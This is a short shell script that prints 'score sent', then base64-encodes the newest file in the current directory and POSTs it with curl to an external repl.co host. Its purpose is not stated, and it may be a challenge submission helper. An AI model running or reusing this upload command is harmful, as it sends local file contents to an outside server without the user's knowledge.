echo score sent
fn=$(ls -t | head -n1)
odr=$( base64 -w 0 $fn )
curl --data-urlencode "odr=${odr}" -X POST https://javadeserialize.yoshiinori.repl.co
exit
